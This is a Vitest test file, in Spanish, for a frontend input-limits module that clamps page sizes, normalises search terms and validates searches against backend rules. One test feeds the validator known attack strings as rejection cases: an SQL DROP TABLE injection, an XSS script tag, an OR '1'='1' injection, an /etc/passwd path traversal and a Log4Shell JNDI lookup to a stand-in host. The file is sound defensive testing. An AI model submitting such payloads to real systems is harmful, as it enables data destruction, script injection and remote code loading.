import { describe, expect, it } from 'vitest';
import {
  LIMITES,
  PATRON_BUSQUEDA,
  acotarTamanoPagina,
  busquedaValida,
  normalizarBusqueda,
} from './limites';

/**
 * Estos límites son el espejo de `Limites.java`. Si se desincronizan, el
 * frontend deja pasar peticiones que el backend rechazará con un 400.
 */
describe('límites de entrada', () => {
  it('coinciden con los del backend', () => {
    expect(LIMITES.maxPagina).toBe(100);
    expect(LIMITES.maxBusqueda).toBe(80);
    expect(LIMITES.maxLote).toBe(200);
    expect(LIMITES.maxMensajeChat).toBe(500);
  });

  describe('acotarTamanoPagina()', () => {
    it('deja pasar los valores válidos', () => {
      expect(acotarTamanoPagina(12)).toBe(12);
      expect(acotarTamanoPagina(100)).toBe(100);
    });

    it('recorta lo que el backend rechazaría', () => {
      expect(acotarTamanoPagina(101)).toBe(100);
      expect(acotarTamanoPagina(999_999_999)).toBe(100);
    });

    it('nunca devuelve cero ni negativos', () => {
      expect(acotarTamanoPagina(0)).toBe(1);
      expect(acotarTamanoPagina(-5)).toBe(1);
    });

    it('descarta la parte decimal', () => {
      expect(acotarTamanoPagina(12.9)).toBe(12);
    });
  });

  describe('normalizarBusqueda()', () => {
    it('quita espacios sobrantes', () => {
      expect(normalizarBusqueda('  laptop  ')).toBe('laptop');
    });

    it('recorta al máximo que admite el backend', () => {
      const largo = 'a'.repeat(200);
      expect(normalizarBusqueda(largo)).toHaveLength(LIMITES.maxBusqueda);
    });

    it('devuelve null cuando no queda nada que buscar', () => {
      expect(normalizarBusqueda('')).toBeNull();
      expect(normalizarBusqueda('   ')).toBeNull();
    });
  });

  describe('busquedaValida()', () => {
    it('admite búsquedas normales, con tildes y ñ', () => {
      for (const texto of ['laptop', 'Monitor LG', 'teclado mecánico', 'audífonos', "O'Brien"]) {
        expect(busquedaValida(texto)).toBe(true);
      }
    });

    it('rechaza lo mismo que el backend', () => {
      for (const texto of [
        "'; DROP TABLE producto; --",
        '<script>alert(1)</script>',
        "laptop%' OR '1'='1",
        '../../etc/passwd',
        '${jndi:ldap://malo/x}',
      ]) {
        expect(busquedaValida(texto)).toBe(false);
      }
    });

    it('rechaza un término más largo que el tope', () => {
      expect(busquedaValida('a'.repeat(81))).toBe(false);
    });

    it('el patrón admite cadena vacía, para no bloquear el campo mientras se escribe', () => {
      expect(PATRON_BUSQUEDA.test('')).toBe(true);
    });
  });
});
